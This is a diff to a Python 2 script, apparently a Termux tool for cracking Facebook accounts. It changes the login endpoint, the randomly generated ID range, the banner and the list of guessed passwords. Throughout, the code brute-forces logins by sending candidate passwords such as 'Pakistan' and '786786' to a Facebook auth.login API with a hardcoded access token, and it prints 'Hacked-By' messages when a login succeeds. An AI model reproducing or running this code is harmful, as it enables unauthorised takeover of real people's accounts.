@@ -4,7 +4,7 @@ import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,ge
 os.system('rm -rf .txt')
 for n in range(99999):
 
-    nmbr = random.randint(11111111111111, 999999999999999)
+    nmbr = random.randint(11111111, 9999999)
     
     sys.stdout = open('.txt', 'a')
 
@@ -149,19 +149,15 @@ logo1 = """
 logo2 = """
 
 
- \033[1;93m$$\      $$\           $$\                                             
- \033[1;93m$$ | $\  $$ |          $$ |                                            
- \033[1;93m$$ |$$$\ $$ | $$$$$$\  $$ | $$$$$$$\  $$$$$$\  $$$$$$\$$$$\   $$$$$$\  
- \033[1;93m$$ $$ $$\$$ |$$  __$$\ $$ |$$  _____|$$  __$$\ $$  _$$  _$$\ $$  __$$\ 
- \033[1;93m$$$$  _$$$$ |$$$$$$$$ |$$ |$$ /      $$ /  $$ |$$ / $$ / $$ |$$$$$$$$ |
- \033[1;93m$$$  / \$$$ |$$   ____|$$ |$$ |      $$ |  $$ |$$ | $$ | $$ |$$   ____|
- \033[1;93m$$  /   \$$ |\$$$$$$$\ $$ |\$$$$$$$\ \$$$$$$  |$$ | $$ | $$ |\$$$$$$$\ 
- \033[1;93m\__/     \__| \_______|\__| \_______| \______/ \__| \__| \__| \_______|
-                                                                       
-                                                                       
-                                                                       
 
- 
+\033[0;96m  ______ _  __     __
+\033[0;92m |  ____| | \ \   / /
+\033[0;95m | |__  | |  \ \_/ / 
+\033[0;92m |  __| | |   \   /  
+\033[0;96m | |    | |____| |   
+\033[0;92m |_|    |______|_|   
+                     
+                    
  \033[1;96m To Pathan Jani Termux Command 💜
                 
 
@@ -259,7 +255,7 @@ def action():
         action()
     print 50* '\033[1;94m-'
     xxxxx = str(len(id))
-    jalan('\033[1;93m▬PROGRAMED BY Zalim Hacker')
+  
    
     jalan ('\033[1;96m Total Number of IDs: '+xxxxx)
     jalan ('\033[1;95mCode you choosed: '+c)
@@ -276,7 +272,7 @@ def action():
             pass
         try:
             pass1 = user 
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            data = br.open('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
                 print(' Hacked-By-Pathan |   User-ID    |   + password'+username)
@@ -295,7 +291,7 @@ def action():
                     cpb.append(c+user+pass1)
                 else:
                     pass2 = k + c + user
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    data = br.open('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
                         print(' Hacked-By-Pathan  |   User-ID    |   + password'+username)   
@@ -313,8 +309,8 @@ def action():
                             cps.close()
                             cpb.append(c+user+pass2)
                         else:
-                            pass3="334455"
-                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            pass3="Pakistan"
+                            data = br.open('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
                                 print(' Hacked-By-Jani |   User-ID    |   + password'+username)
@@ -332,8 +328,8 @@ def action():
                                     cps.close()
                                     cpb.append(c+user+pass3)
                                 else:
-                                    pass4="223344"
-                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                    pass4="786786"
+                                    data = br.open('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
                                         print(' Hacked-By-Jani  |   User-ID    |   + password'+username)
@@ -352,7 +348,7 @@ def action():
                                             cpb.append(c+user+pass4)
                                         else:
                                             pass6="556677"
-                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            data = br.open('https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
                                                 print(' Hacked-By-Jani  |   User-ID    |   + password'+username)
